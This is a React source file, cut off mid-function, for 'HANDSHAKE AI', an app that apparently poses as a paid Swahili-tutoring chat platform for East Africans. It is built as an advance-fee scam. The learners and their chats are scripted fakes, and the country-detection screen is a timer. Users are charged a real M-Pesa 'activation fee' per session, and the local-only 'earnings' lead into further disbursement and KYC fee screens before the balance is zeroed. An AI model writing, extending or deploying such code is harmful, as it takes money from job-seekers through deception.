import React, { createContext, useContext, useEffect, useRef, useState } from 'react';
import ReactDOM from 'react-dom/client';
import {
  LayoutGrid, DollarSign, User, CheckCircle, Globe, MessageSquare, Lock,
  Star, Unlock, Smartphone, XCircle, ArrowLeft, Send, CheckSquare,
  Clock, TrendingUp, Wallet, CreditCard, Bitcoin, Lightbulb, Award,
  Pencil, ShieldCheck, ArrowRight, BadgeCheck
} from 'lucide-react';

/* ═══════════════════ DATA ═══════════════════ */
const LEARNERS = {
  10: { name: 'John Smith', ini: 'JS', col: '#3f51b5', country: 'USA', level: 'Beginner', bio: 'I want to learn Swahili for my trip to Tanzania.', tags: ['Travel', 'Culture', 'Food'] },
  11: { name: 'Emma Wilson', ini: 'EW', col: '#009688', country: 'UK', level: 'Beginner', bio: 'Interested in East African culture and languages.', tags: ['Culture', 'History', 'Music'] },
  12: { name: 'Michael Brown', ini: 'MB', col: '#e91e63', country: 'Canada', level: 'Intermediate', bio: 'Planning to work in Kenya, need to improve my Swahili.', tags: ['Business', 'Travel', 'Sports'] },
  13: { name: 'Sarah Johnson', ini: 'SJ', col: '#ff9800', country: 'Australia', level: 'Beginner', bio: 'Moving to Tanzania for a teaching job.', tags: ['Education', 'Travel', 'Culture'] },
  14: { name: 'David Martinez', ini: 'DM', col: '#9c27b0', country: 'Spain', level: 'Intermediate', bio: 'Learning Swahili to connect with my Kenyan friends.', tags: ['Culture', 'Sports', 'Music'] },
  15: { name: 'Lisa Chen', ini: 'LC', col: '#ec4899', country: 'Singapore', level: 'Beginner', bio: 'Planning a safari adventure in East Africa.', tags: ['Travel', 'Wildlife', 'Photography'] }
};
const CHAT_SCRIPTS = {
  10: ["Hello! I'm excited to start learning Swahili!", "Can you teach me how to greet someone?", "What does 'Habari' mean?"],
  11: ["Hi there! I love East African culture.", "How do you say 'thank you' in Swahili?", "What are some common phrases?"],
  12: ["Good morning! I need to practice business Swahili.", "How would I say 'meeting' in Swahili?", "How do I introduce myself professionally?"],
  13: ["Hi! I'm moving to Tanzania soon.", "How do I say 'where is the school'?", "Can you help me with numbers?"],
  14: ["Hola! My Kenyan friends say I should learn Swahili.", "What's the word for 'friend'?", "Can we practice a conversation?"],
  15: ["Hello! I'm going on safari soon.", "How do I say 'lion' and 'elephant' in Swahili?", "What phrases are useful on safari?"]
};
const REPLIES = [
  "Asante sana! That means 'thank you very much'.",
  "Nzuri! You're doing great — 'nzuri' means good.",
  "Karibu sana! You're really getting it!",
  "Sawa sawa! That means 'okay okay' — you're learning fast!",
  "Exactly! Swahili isn't that hard once you start."
];

/* ═══════════════════ POLLING (20s minimum) ═══════════════════ */
async function pollPaymentStatus(transactionId, { intervalMs = 2000, maxWaitMs = 90000, minWaitMs = 20000, signal } = {}) {
  const start = Date.now();
  let lastStatus = null;
  let resolvedStatus = null;

  while (Date.now() - start < maxWaitMs) {
    if (signal?.aborted) return 'cancelled';
    try {
      const r = await fetch(`/api/status?transactionId=${encodeURIComponent(transactionId)}`);
      const d = await r.json();
      lastStatus = d.status;
      console.log('[poll]', transactionId, '→', d.status);

      if (d.status === 'COMPLETED' || d.status === 'SUCCESS') { resolvedStatus = 'success'; break; }
      if (d.status === 'FAILED' || d.status === 'CANCELLED' || d.status === 'REJECTED') { resolvedStatus = 'failed'; break; }
    } catch (err) {
      console.warn('[poll err]', err);
    }
    await new Promise(res => setTimeout(res, intervalMs));
    if (signal?.aborted) return 'cancelled';
  }

  if (!resolvedStatus) {
    resolvedStatus = lastStatus === 'COMPLETED' ? 'success' : 'timeout';
  }

  // Enforce 20-second minimum — success only shows after full 20s
  const elapsed = Date.now() - start;
  if (resolvedStatus === 'success' && elapsed < minWaitMs) {
    const remaining = minWaitMs - elapsed;
    console.log(`[poll] success detected at ${elapsed}ms — holding ${remaining}ms more for 20s minimum`);
    await new Promise(res => setTimeout(res, remaining));
  }

  if (signal?.aborted) return 'cancelled';
  return resolvedStatus;
}

/* ═══════════════════ CONTEXT ═══════════════════ */
const AppContext = createContext(null);
const useApp = () => useContext(AppContext);

function AppProvider({ children }) {
  const [view, setView] = useState('dashboard');
  const [activated, setActivated] = useState(false);
  const [verified, setVerified] = useState(false);
  const [balance, setBalance] = useState(0);
  const [totalEarned, setTotalEarned] = useState(0);
  const [tasksDone, setTasksDone] = useState(0);
  const [ledger, setLedger] = useState([]);
  const [profile, setProfile] = useState({ fullname: 'Guest User', email: '', phone: '' });
  const [activeLearner, setActiveLearner] = useState(null);
  const [activeCount, setActiveCount] = useState(0);
  const [actModalOpen, setActModalOpen] = useState(false);
  const [stkState, setStkState] = useState(null);
  const [stkPhone, setStkPhone] = useState('');
  const [stkCancelFn, setStkCancelFn] = useState(null);
  const [editModalOpen, setEditModalOpen] = useState(false);
  const [mobDrawerOpen, setMobDrawerOpen] = useState(false);
  const [withdrawalStage, setWithdrawalStage] = useState(null);
  const [withdrawalPhone, setWithdrawalPhone] = useState('');

  const creditChatEarning = () => {
    setTasksDone(t => t + 1);
    setBalance(b => b + 13.68);
    setTotalEarned(t => t + 13.68);
    const now = new Date();
    setLedger(l => [{ date: now.toLocaleDateString(), method: 'Chat Session', amount: '$13.68', status: 'Completed' }, ...l]);
  };

  const endChat = () => {
    creditChatEarning();
    setActiveCount(c => Math.max(0, c - 1));
    setView('earnings');
  };

  const activateChats = () => { setActivated(true); };

  return (
    <AppContext.Provider value={{
      view, setView, activated, setActivated, verified, setVerified,
      balance, setBalance, totalEarned, setTotalEarned, tasksDone, setTasksDone,
      ledger, setLedger, profile, setProfile, activeLearner, setActiveLearner,
      activeCount, setActiveCount, actModalOpen, setActModalOpen,
      stkState, setStkState, stkPhone, setStkPhone,
      stkCancelFn, setStkCancelFn,
      editModalOpen, setEditModalOpen, mobDrawerOpen, setMobDrawerOpen,
      endChat, creditChatEarning,
      withdrawalStage, setWithdrawalStage, withdrawalPhone, setWithdrawalPhone,
      endWithdrawal: () => { setWithdrawalStage(null); setWithdrawalPhone(''); setBalance(0); setView('earnings'); }
    }}>
      {children}
    </AppContext.Provider>
  );
}

/* ═══════════════════ ONBOARDING ═══════════════════ */
const OB_STEPS = [
  { icon: '🌍', label: 'Detecting your country...' },
  { icon: '📡', label: 'Analyzing location data...' },
  { icon: '🌐', label: 'Connecting to East Africa servers...' },
  { icon: '💰', label: 'Loading payment methods...' },
  { icon: '📱', label: 'Verifying M-Pesa integration...' },
  { icon: '✦', label: 'Finalizing setup...' }
];
function Onboarding({ onDone }) {
  const [step, setStep] = useState(0);
  const [done, setDone] = useState(false);
  useEffect(() => {
    if (step >= OB_STEPS.length) { const t = setTimeout(() => setDone(true), 500); return () => clearTimeout(t); }
    const t = setTimeout(() => setStep(s => s + 1), 620);
    return () => clearTimeout(t);
  }, [step]);
  return (
    <div className="ob-overlay">
      <div className="ob-card" style={{ display: done ? 'none' : 'block' }}>
        <h2 style={{ fontSize: 'clamp(1.35rem,5vw,1.7rem)', marginBottom: 4, textAlign: 'center' }}>Welcome to HANDSHAKE AI</h2>
        <p style={{ color: '#64748b', fontSize: '.86rem', marginBottom: 16, textAlign: 'center' }}>Kenya • Tanzania • Uganda</p>
        <div className="ob-status" style={{ visibility: step >= OB_STEPS.length ? 'visible' : 'hidden' }}>
          <CheckCircle size={15} style={{ color: '#10b981' }} /><span>KE Kenya detected and supported!</span>
        </div>
        <div className="ob-steps">
          {OB_STEPS.map((s, i) => {
            const isDone = i < step, isActive = i === step;
            return (
              <div key={i} className={`ob-step ${isDone ? 'done' : ''} ${isActive ? 'active' : ''}`}>
                <span>{s.icon}</span><span style={{ flexGrow: 1 }}>{s.label}</span>
                {isDone && <CheckCircle size={14} style={{ color: 'var(--green)' }} />}
                {isActive && <div className="spin" />}
              </div>
            );
          })}
        </div>
        <div className="ob-prog"><div className="ob-prog-bar" style={{ width: `${(step / OB_STEPS.length) * 100}%` }} /></div>
      </div>
      <div className="ob-card" style={{ display: done ? 'block' : 'none', textAlign: 'center' }}>
        <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginBottom: 13 }}>
          <div className="globe-circle"><Globe size={28} style={{ color: '#fff' }} /></div>
          <span className="globe-badge">East Africa</span>
        </div>
        <h2 style={{ fontSize: 'clamp(1.35rem,5vw,1.7rem)', marginBottom: 4 }}>Welcome to HANDSHAKE AI</h2>
        <p style={{ color: '#64748b', fontSize: '.86rem', marginBottom: 18 }}>Kenya • Tanzania • Uganda</p>
        <div className="sbox">
          <CheckCircle size={21} style={{ color: '#10b981', flexShrink: 0 }} />
          <div style={{ textAlign: 'left' }}>
            <div style={{ color: '#065f46', fontSize: '.9rem', fontWeight: 700 }}>KE Kenya Detected!</div>
            <div style={{ color: '#047857', fontSize: '.8rem' }}>Your country is fully supported</div>
          </div>
        </div>
        <button className="ob-btn" onClick={onDone}>Continue to Dashboard →</button>
      </div>
    </div>
  );
}

/* ═══════════════════ HEADER ═══════════════════ */
function Header() {
  const { view, setView, setMobDrawerOpen } = useApp();
  return (
    <header className="app-header">
      <div className="logo">HANDSHAKE<span className="logo-ai">AI</span><span className="logo-ke">KE</span></div>
      <nav>
        <a className={view === 'dashboard' ? 'active' : ''} onClick={e => { e.preventDefault(); setView('dashboard'); }}><LayoutGrid size={16} /><span className="nav-txt">Dashboard</span></a>
        <a className={view === 'earnings' ? 'active' : ''} onClick={e => { e.preventDefault(); setView('earnings'); }}><DollarSign size={16} /><span className="nav-txt">Earnings</span></a>
        <a className={view === 'profile' ? 'active' : ''} onClick={e => { e.preventDefault(); setView('profile'); }}><User size={16} /><span className="nav-txt">Profile</span></a>
      </nav>
      <div className="profile-section">
        <button className="ham-btn" onClick={() => setMobDrawerOpen(true)} aria-label="Menu"><span /><span /><span /></button>
      </div>
    </header>
  );
}

/* ═══════════════════ MOBILE DRAWER ═══════════════════ */
function MobileDrawer() {
  const { mobDrawerOpen, setMobDrawerOpen, view, setView, profile } = useApp();
  const close = () => setMobDrawerOpen(false);
  const go = v => { setView(v); close(); };
  return (
    <>
      <div className={`mob-drawer-overlay ${mobDrawerOpen ? 'open' : ''}`} onClick={close} />
      <div className={`mob-drawer ${mobDrawerOpen ? 'open' : ''}`}>
        <div className="mob-drawer-head">
          <div className="mob-drawer-logo">HANDSHAKE<span className="logo-ai" style={{ marginLeft: 4 }}>AI</span><span className="logo-ke" style={{ marginLeft: 3 }}>KE</span></div>
          <button className="mob-drawer-close" onClick={close}>✕</button>
        </div>
        <div className="mob-nav">
          <a className={view === 'dashboard' ? 'active' : ''} onClick={e => { e.preventDefault(); go('dashboard'); }}><LayoutGrid size={18} /> Dashboard</a>
          <a className={view === 'earnings' ? 'active' : ''} onClick={e => { e.preventDefault(); go('earnings'); }}><DollarSign size={18} /> Earnings</a>
          <a className={view === 'profile' ? 'active' : ''} onClick={e => { e.preventDefault(); go('profile'); }}><User size={18} /> Profile</a>
        </div>
        <div className="mob-user-bar">
          <div className="mob-user-av">{(profile.fullname || 'U').charAt(0).toUpperCase()}</div>
          <div className="mob-user-info">
            <div className="mob-uname">{profile.fullname || 'User'}</div>
            <div className="mob-uemail">{profile.email || '-'}</div>
          </div>
        </div>
      </div>
    </>
  );
}

/* ═══════════════════ DASHBOARD ═══════════════════ */
function Dashboard() {
  const { activated, setActModalOpen, setActiveLearner, setView, activeCount, setActiveCount } = useApp();
  const openChat = id => { setActiveLearner(id); setActiveCount(c => Math.min(c + 1, 6)); setView('chat'); };
  const onLearnerClick = id => { if (!activated) setActModalOpen(true); else openChat(id); };
  return (
    <div className="dash-wrap">
      <h1 className="dash-title">Online Learners</h1>
      <p className="dash-sub">Connect with people who want to learn Swahili. Earn $13.68 per chat session.</p>
      <div className="stats-strip">
        <div className="stats-left">
          <div className="stat-item" style={{ color: 'var(--blue)' }}><MessageSquare size={15} /><span>Active Chats: <b>{activeCount}/6</b></span></div>
          <div className="stat-item" style={{ color: 'var(--green)' }}><DollarSign size={15} /><span>Per chat: <b>$13.68</b></span></div>
        </div>
        {!activated && (
          <button onClick={() => setActModalOpen(true)} className="gbtn" style={{ background: '#e65100', padding: '9px 13px', fontSize: '.83rem', whiteSpace: 'nowrap' }}>Activate Chat Access</button>
        )}
      </div>
      {!activated && (
        <div className="warn-banner">
          <div className="warn-title"><Lock size={16} style={{ color: '#ca8a04' }} /> Chat Activation Required</div>
          <div className="warn-text">Pay a small activation fee to start chatting and earning. This fee is required for each chat session.</div>
        </div>
      )}
      <div className="learn-grid">
        {Object.keys(LEARNERS).map(id => {
          const l = LEARNERS[id], key = Number(id);
          return (
            <div className="learn-card" key={id}>
              <div className="learn-head">
                <div className="avatar" style={{ background: l.col }}>{l.ini}<span className="dot" /></div>
                <div>
                  <div className="learn-name">{l.name}</div>
                  <span className="learn-country"><Globe size={12} />{l.country}</span>
                </div>
              </div>
              <span className={`lvl ${l.level === 'Beginner' ? 'lvl-b' : 'lvl-i'}`}><Star size={10} />{l.level}</span>
              <p className="learn-bio">{l.bio}</p>
              <div className="tags">{l.tags.map(t => <span className="tag" key={t}>{t}</span>)}</div>
              <button onClick={() => onLearnerClick(key)} className={`lock-btn ${activated ? 'open' : ''}`}>
                {activated ? <><Unlock size={14} /> Start Chat</> : <><Lock size={14} /> Locked</>}
              </button>
            </div>
          );
        })}
      </div>
    </div>
  );
}

/* ═══════════════════ ACTIVATION MODAL (KSh 180) ═══════════════════ */
function ActivationModal() {
  const { actModalOpen, setActModalOpen, setStkState, setStkPhone, setStkCancelFn } = useApp();
  const [phone, setPhone] = useState('');
  const [phoneErr, setPhoneErr] = useState('');
  const [alert, setAlert] = useState(null);
  const [loading, setLoading] = useState(false);
  const PRICE_KES = 180;

  const normalize = raw => {
    let p = raw.replace(/\D/g, '');
    if (p.startsWith('0')) p = '254' + p.slice(1);
    if (p.length === 9 && (p.startsWith('7') || p.startsWith('1'))) p = '254' + p;
    if (p.length === 10 && (p.startsWith('07') || p.startsWith('01'))) p = '254' + p.slice(1);
    if (!p.startsWith('254')) p = '254' + p;
    return p;
  };

  const close = () => { setActModalOpen(false); setPhone(''); setPhoneErr(''); setAlert(null); setLoading(false); };

  const initSTK = async () => {
    setAlert(null);
    if (!phone.trim()) { setPhoneErr('Please enter your M-Pesa number'); return; }
    const norm = normalize(phone);
    if (!/^254[17]\d{8}$/.test(norm)) { setPhoneErr('Please enter a valid M-Pesa number'); return; }
    setPhoneErr(''); setLoading(true);
    try {
      const reference = `HS_${Date.now()}_${Math.floor(Math.random() * 10000)}`;
      const resp = await fetch('/api/stk-push', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: norm, amount: PRICE_KES, reference, description: 'HANDSHAKE AI - Chat Activation Fee' })
      });
      const data = await resp.json();
      if (!resp.ok) throw new Error(data.error || data.message || 'STK push failed');
      if (data?.transactionId) {
        setStkPhone(norm);
        close();
        setStkState('waiting');

        const controller = new AbortController();
        setStkCancelFn(() => () => controller.abort());

        const result = await pollPaymentStatus(data.transactionId, { signal: controller.signal });

        setStkCancelFn(null);
        if (result === 'success') setStkState('success');
        else if (result === 'cancelled') { /* overlay closed */ }
        else setStkState('fail');
      } else {
        setAlert({ type: 'error', msg: data?.message || 'STK push failed. Try again.' });
        setLoading(false);
      }
    } catch (err) {
      setAlert({ type: 'error', msg: err.message || 'Network error. Try again.' });
      setLoading(false);
    }
  };

  if (!actModalOpen) return null;
  return (
    <div className="modal-ov open">
      <div className="modal-box">
        <div className="modal-ico-dollar">$</div>
        <h2 className="modal-title">Activate Chat Access</h2>
        <p className="modal-desc">Pay activation fee to start chatting and earning $13.68 per chat session</p>
        <div className="modal-fee">
          <span className="mf-lbl">Activation Fee:</span>
          <div><span className="mf-usd">$1.40 USD</span><span className="mf-kes">≈ KES {PRICE_KES}</span></div>
        </div>
        <div className="mig">
          <label>M-Pesa Phone Number</label>
          <input type="tel" value={phone} onChange={e => setPhone(e.target.value)} placeholder="0712345678 or 254712345678" inputMode="numeric" />
          {phoneErr && <div className="mig-error" style={{ display: 'block' }}>{phoneErr}</div>}
        </div>
        {alert && <div className={`alert alert-${alert.type}`} style={{ display: 'block' }}>{alert.msg}</div>}
        <div className="modal-btns">
          <button onClick={close} className="mbtn mbtn-cancel">Cancel</button>
          <button onClick={initSTK} className="mbtn mbtn-pay" disabled={loading}>{loading ? 'Sending...' : `Pay KES ${PRICE_KES}`}</button>
        </div>
        <p className="modal-disc">You will receive an M-Pesa STK push on your phone. Enter your PIN to complete payment.</p>
      </div>
    </div>
  );
}

/* ═══════════════════ STK OVERLAY ═══════════════════ */
function StkOverlay() {
  const { stkState, setStkState, stkPhone, setActivated, stkCancelFn, setStkCancelFn } = useApp();
  if (!stkState) return null;

  const onCancel = () => {
    if (stkCancelFn) stkCancelFn();
    setStkCancelFn(null);
    setStkState(null);
  };

  const onSuccess = () => { setActivated(true); setStkState(null); };

  return (
    <div className="stk-ov open">
      <div className="stk-card">
        {stkState === 'sending' && (<>
          <div className="stk-spinner" />
          <div className="stk-title">Sending STK Push...</div>
          <div className="stk-desc">Connecting to M-Pesa. Please wait.</div>
        </>)}
        {stkState === 'waiting' && (<>
          <div className="stk-phone-ico"><Smartphone size={26} style={{ color: 'var(--green)' }} /></div>
          <div className="stk-title">Check Your Phone</div>
          <div className="stk-desc">An M-Pesa prompt has been sent to <b>{stkPhone.replace(/^254/, '0')}</b>.<br />Enter your PIN to pay <b>KES 180</b>.</div>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6, fontSize: '.82rem', color: 'var(--tm)', marginBottom: 6 }}>
            <div className="spin" /> Waiting for payment confirmation...
          </div>
          <p style={{ fontSize: '.72rem', color: 'var(--tm)', marginBottom: 10 }}>Please wait up to 20 seconds</p>
          <button className="stk-cancel-link" onClick={onCancel}>Cancel</button>
        </>)}
        {stkState === 'success' && (<>
          <div className="stk-success-ico"><CheckCircle size={28} style={{ color: 'var(--green)' }} /></div>
          <div className="stk-title">Payment Successful!</div>
          <div className="stk-desc">KES 180 received. Your chat access is now active. Start chatting and earning!</div>
          <button className="stk-retry-btn" onClick={onSuccess}>Start Chatting →</button>
        </>)}
        {stkState === 'fail' && (<>
          <div className="stk-fail-ico"><XCircle size={28} style={{ color: 'var(--red)' }} /></div>
          <div className="stk-title">Payment Failed</div>
          <div className="stk-desc">The payment was not completed. Please try again.</div>
          <button className="stk-retry-btn" onClick={() => setStkState(null)}>Try Again</button>
          <button className="stk-cancel-link" onClick={() => setStkState(null)}>Cancel</button>
        </>)}
      </div>
    </div>
  );
}

/* ═══════════════════ CHAT ═══════════════════ */
function Chat() {
  const { activeLearner, setView, creditChatEarning } = useApp();
  const [messages, setMessages] = useState([]);
  const [input, setInput] = useState('');
  const [showEarnBanner, setShowEarnBanner] = useState(false);
  const userMsgCount = useRef(0);
  const chatIdx = useRef(0);
  const replyIdxRef = useRef(0);
  const intervalRef = useRef(null);
  const msgsRef = useRef(null);
  const learner = LEARNERS[activeLearner];

  const pushMsg = (text, who) => {
    const now = new Date();
    const time = `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}`;
    setMessages(m => [...m, { text, who, time }]);
    setTimeout(() => { if (msgsRef.current) msgsRef.current.scrollTop = msgsRef.current.scrollHeight; }, 50);
  };

  useEffect(() => {
    if (!learner) return;
    setMessages([]); chatIdx.current = 0; replyIdxRef.current = 0; userMsgCount.current = 0;
    setShowEarnBanner(false);
    const scripts = CHAT_SCRIPTS[activeLearner] || CHAT_SCRIPTS[10];
    const t = setTimeout(() => { pushMsg(scripts[0], 'them'); chatIdx.current = 1; }, 800);
    intervalRef.current = setInterval(() => {
      if (chatIdx.current < scripts.length) { pushMsg(scripts[chatIdx.current], 'them'); chatIdx.current++; }
      else clearInterval(intervalRef.current);
    }, 7000);
    return () => { clearTimeout(t); if (intervalRef.current) clearInterval(intervalRef.current); };
    // eslint-disable-next-line
  }, [activeLearner]);

  const send = e => {
    e.preventDefault();
    const txt = input.trim(); if (!txt) return;
    pushMsg(txt, 'me'); setInput('');
    const reply = REPLIES[replyIdxRef.current % REPLIES.length];
    replyIdxRef.current++;
    setTimeout(() => pushMsg(reply, 'them'), 1400);

    userMsgCount.current += 1;
    if (userMsgCount.current >= 2 && !showEarnBanner) {
      creditChatEarning();
      setShowEarnBanner(true);
    }
  };

  if (!learner) return null;

  return (
    <div className="chat-wrap">
      <div className="chat-container">
        <div className="chat-hd">
          <button className="chat-back" onClick={() => setView('dashboard')}><ArrowLeft size={20} /></button>
          <div className="chat-partner">
            <div className="avatar" style={{ width: 36, height: 36, fontSize: '.85rem', background: learner.col }}>{learner.ini}</div>
            <div>
              <div className="chat-name">{learner.name}</div>
              <span style={{ fontSize: '.73rem', color: 'var(--green)' }}>Active now</span>
            </div>
          </div>
        </div>
        <div className="chat-msgs" ref={msgsRef}>
          {messages.map((m, i) => (
            <div className="msg-row" key={i} style={{ justifyContent: m.who === 'me' ? 'flex-end' : 'flex-start' }}>
              {m.who === 'them' ? (
                <div style={{ display: 'flex', gap: 7, alignItems: 'flex-end' }}>
                  <div className="avatar" style={{ width: 28, height: 28, fontSize: '.68rem', background: learner.col, flexShrink: 0 }}>{learner.ini}</div>
                  <div className="bubble" style={{ background: '#fff', border: '1px solid var(--border)', color: 'var(--t1)' }}>
                    <span style={{ fontSize: '.86rem' }}>{m.text}</span>
                    <span className="btime" style={{ color: 'var(--tm)' }}>{m.time}</span>
                  </div>
                </div>
              ) : (
                <div className="bubble" style={{ background: 'var(--green)', color: '#fff' }}>
                  <span style={{ fontSize: '.86rem' }}>{m.text}</span>
                  <span className="btime" style={{ color: 'rgba(255,255,255,.7)' }}>{m.time}</span>
                </div>
              )}
            </div>
          ))}
        </div>

        {showEarnBanner && (
          <div className="chat-earn-banner">
            <div className="ceb-info">
              <div className="ceb-icon"><DollarSign size={22} /></div>
              <div>
                <div className="ceb-amount">+ $13.68</div>
                <div className="ceb-label">Session complete</div>
              </div>
            </div>
            <button className="ceb-btn" onClick={() => setView('earnings')}>
              View Earnings <ArrowRight size={14} />
            </button>
          </div>
        )}

        <form className="chat-form" onSubmit={send}>
          <input type="text" value={input} onChange={e => setInput(e.target.value)} placeholder="Type your message..." required />
          <button type="submit" className="gbtn"><Send size={18} /></button>
        </form>
      </div>
    </div>
  );
}

/* ═══════════════════ EARNINGS ═══════════════════ */
function Earnings() {
  const { balance, totalEarned, tasksDone, ledger, setWithdrawalStage } = useApp();
  const [withdrawn] = useState(0);
  const canWithdraw = balance >= 1;

  const requestPayout = () => {
    if (!canWithdraw) return;
    setWithdrawalStage('disbursement');
  };

  return (
    <div className="earn-wrap">
      <h1 className="dash-title">My Earnings</h1>
      <p className="dash-sub" style={{ marginBottom: 18 }}>Track your payments and earnings</p>
      <div className="bal-banner">
        <div>
          <div className="bal-title">Available Balance</div>
          <div className="bal-val">$<span>{balance.toFixed(2)}</span> USD</div>
          <div className="bal-min">Minimum withdrawal amount is $1 USD</div>
        </div>
        <button onClick={requestPayout} disabled={!canWithdraw} className={`wd-btn ${canWithdraw ? 'enabled' : ''}`}>
          <Wallet size={15} /> Request Withdrawal
        </button>
      </div>
      <div className="earn-stats">
        <div className="estat-card"><div><div className="estat-lbl">Total Earnings</div><div className="estat-val">${totalEarned.toFixed(2)}</div></div><div className="estat-icon ic-gb"><DollarSign size={18} /></div></div>
        <div className="estat-card"><div><div className="estat-lbl">Withdrawn</div><div className="estat-val">${withdrawn.toFixed(2)}</div></div><div className="estat-icon ic-bb"><CheckSquare size={18} /></div></div>
        <div className="estat-card"><div><div className="estat-lbl">Pending Tasks</div><div className="estat-val">$0.00</div></div><div className="estat-icon ic-ob"><Clock size={18} /></div></div>
        <div className="estat-card"><div><div className="estat-lbl">Tasks Completed</div><div className="estat-val">{tasksDone}</div></div><div className="estat-icon ic-gb"><TrendingUp size={18} /></div></div>
      </div>
      <div className="hist-box">
        <div className="hist-title">Earnings History</div>
        {ledger.length === 0 ? <div className="hist-empty">No earnings yet</div> : (
          <div style={{ overflowX: 'auto' }}>
            <table className="hist-tbl">
              <thead><tr><th>Date</th><th>Method</th><th>Amount</th><th>Status</th></tr></thead>
              <tbody>{ledger.map((e, i) => <tr key={i}><td>{e.date}</td><td>{e.method}</td><td><b>{e.amount}</b></td><td className="status-ok">{e.status}</td></tr>)}</tbody>
            </table>
          </div>
        )}
      </div>
      <div className="wd-info">
        <div className="wd-info-title">Withdrawal Information</div>
        <div className="wd-row"><div className="wd-ico wi-mp"><Smartphone size={14} /></div><div><b style={{ fontSize: '.88rem' }}>M-Pesa</b><span style={{ fontSize: '.76rem', color: 'var(--t2)' }}> Processed within 24 hours</span></div></div>
        <div className="wd-row"><div className="wd-ico wi-pp"><CreditCard size={14} /></div><div><b style={{ fontSize: '.88rem' }}>PayPal</b><span style={{ fontSize: '.76rem', color: 'var(--t2)' }}> Processed within 24–48 hours</span></div></div>
        <div className="wd-row"><div className="wd-ico wi-bt"><Bitcoin size={14} /></div><div><b style={{ fontSize: '.88rem' }}>Bitcoin</b><span style={{ fontSize: '.76rem', color: 'var(--t2)' }}> Processed within 24–48 hours</span></div></div>
      </div>
      <div className="pro-tip">
        <Lightbulb size={17} style={{ color: '#eab308' }} />
        <div><b style={{ color: '#1e3a8a', fontSize: '.88rem' }}>Pro Tip</b>
          <p style={{ color: '#1e40af', fontSize: '.82rem', marginTop: 2 }}>Complete high-quality tasks to earn bonus payments and improve your quality score for access to premium tasks!</p>
        </div>
      </div>
    </div>
  );
}

/* ═══════════════════ PROFILE ═══════════════════ */
function Profile() {
  const { tasksDone, profile, verified, setEditModalOpen, setWithdrawalStage } = useApp();
  return (
    <div className="profile-wrap">
      <h1 className="dash-title">My Profile</h1>
      <p className="dash-sub">Manage your account settings and information</p>
      <div className="profile-stat-grid">
        <div className="pstat-card"><div className="pstat-icon-wrap" style={{ background: '#f0fdf4' }}><Award size={24} style={{ color: 'var(--green)' }} /></div><div className="pstat-label">Tasks Completed</div><div className="pstat-value">{tasksDone}</div></div>
        <div className="pstat-card"><div className="pstat-icon-wrap" style={{ background: '#fef3c7' }}><Star size={24} style={{ color: 'var(--orange)' }} /></div><div className="pstat-label">Average Rating</div><div className="pstat-value">{tasksDone > 0 ? '4.8' : 'N/A'}</div></div>
        <div className="pstat-card"><div className="pstat-icon-wrap" style={{ background: '#eff6ff' }}><TrendingUp size={24} style={{ color: 'var(--blue)' }} /></div><div className="pstat-label">Quality Score</div><div className="pstat-value">{tasksDone > 0 ? '92%' : '0%'}</div></div>
      </div>
      <div className="profile-section-card">
        <div className="profile-section-head">
          <div className="profile-section-title">Personal Information</div>
          <button className="edit-btn" onClick={() => setEditModalOpen(true)}><Pencil size={13} /> Edit Profile</button>
        </div>
        <div className="profile-info-row"><div className="profile-info-label">Email</div><div className="profile-info-value">{profile.email || '-'}</div></div>
        <div className="profile-info-row"><div className="profile-info-label">Full Name</div><div className="profile-info-value">{profile.fullname || '-'}</div></div>
        <div className="profile-info-row"><div className="profile-info-label">Phone Number</div><div className="profile-info-value">{profile.phone || 'Not set'}</div></div>
      </div>
      <div className="profile-section-card">
        <div className="profile-section-head"><div className="profile-section-title">Account Status</div></div>
        <div className="acct-status-row">
          <div className="acct-status-label">Account Verification</div>
          {verified ? <span className="verify-status-badge verify-badge-yes"><CheckCircle size={13} /> Verified</span>
            : <span className="verify-status-badge verify-badge-no"><XCircle size={13} /> Not Verified</span>}
        </div>
        <p style={{ fontSize: '.84rem', color: 'var(--t2)', marginBottom: 0 }}>Complete verification to start earning. Quick process with M-Pesa payment.</p>
        {!verified && (
          <div className="verify-cta-box">
            <div className="verify-cta-title"><span style={{ fontSize: '1.1rem' }}>🚀</span> Get Verified Now</div>
            <div className="verify-cta-desc">Complete KYC verification to release your funds. Quick process with M-Pesa payment.</div>
            <button className="verify-cta-btn" onClick={() => setWithdrawalStage('kyc-fee')}>
              <ShieldCheck size={15} /> Complete KYC Verification
            </button>
          </div>
        )}
      </div>
    </div>
  );
}

/* ═══════════════════ EDIT PROFILE MODAL ═══════════════════ */
function EditProfileModal() {
  const { editModalOpen, setEditModalOpen, profile, setProfile } = useApp();
  const [name, setName] = useState('');
  const [email, setEmail] = useState('');
  const [phone, setPhone] = useState('');
  const [alert, setAlert] = useState(null);
  useEffect(() => {
    if (editModalOpen) { setName(profile.fullname || ''); setEmail(profile.email || ''); setPhone(profile.phone || ''); setAlert(null); }
  }, [editModalOpen, profile]);
  if (!editModalOpen) return null;
  const close = () => setEditModalOpen(false);
  const save = () => {
    if (!name.trim()) { setAlert({ type: 'error', msg: 'Please enter your full name.' }); return; }
    if (!email.trim()) { setAlert({ type: 'error', msg: 'Please enter an email address.' }); return; }
    setProfile({ fullname: name.trim(), email: email.trim(), phone: phone.trim() });
    setAlert({ type: 'success', msg: 'Profile updated successfully!' });
    setTimeout(close, 900);
  };
  return (
    <div className="edit-modal-ov open">
      <div className="edit-modal-box">
        <div className="edit-modal-title">Edit Profile</div>
        <div className="fg"><label>Full Name</label><input type="text" value={name} onChange={e => setName(e.target.value)} placeholder="Your full name" /></div>
        <div className="fg"><label>Email Address</label><input type="email" value={email} onChange={e => setEmail(e.target.value)} placeholder="name@example.com" /></div>
        <div className="fg"><label>Phone Number (M-Pesa)</label><input type="tel" value={phone} onChange={e => setPhone(e.target.value)} placeholder="0712345678" /></div>
        {alert && <div className={`alert alert-${alert.type}`} style={{ display: 'block' }}>{alert.msg}</div>}
        <div className="edit-modal-btns">
          <button className="emod-cancel" onClick={close}>Cancel</button>
          <button className="emod-save" onClick={save}>Save Changes</button>
        </div>
      </div>
    </div>
  );
}

/* ═══════════════════ DISBURSEMENT FEE (KSh 300) ═══════════════════ */
function DisbursementFee() {
  const { setWithdrawalStage, setWithdrawalPhone, setStkCancelFn } = useApp();
  const [phone, setPhone] = useState('');
